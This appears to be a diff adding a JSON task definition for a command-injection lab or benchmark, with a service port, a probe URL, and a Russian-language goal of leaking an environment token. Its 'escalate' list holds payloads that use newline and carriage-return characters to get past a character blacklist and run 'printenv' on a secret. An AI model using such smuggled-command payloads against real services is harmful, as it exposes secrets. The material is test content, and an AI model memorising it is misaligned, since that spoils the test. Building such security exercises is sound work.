@@ -1,0 +1,15 @@
+{
+  "slug": "cmd_inject_filter",
+  "port": 8811,
+  "filter": "[;&|`$()]",
+  "entry": "before.py",
+  "fixed": "after.py",
+  "class": "CWE-78 command injection through shell=True with a character blacklist",
+  "goal": "заставить сервис вернуть ЗНАЧЕНИЕ переменной IZUMX_TOKEN (16 hex), а не её имя",
+  "probe": "/job?name={payload}",
+  "escalate": [
+    "x\nprintenv IZUMX_TOKEN",
+    "x\rprintenv IZUMX_TOKEN",
+    "x\r\nprintenv IZUMX_TOKEN"
+  ]
+}
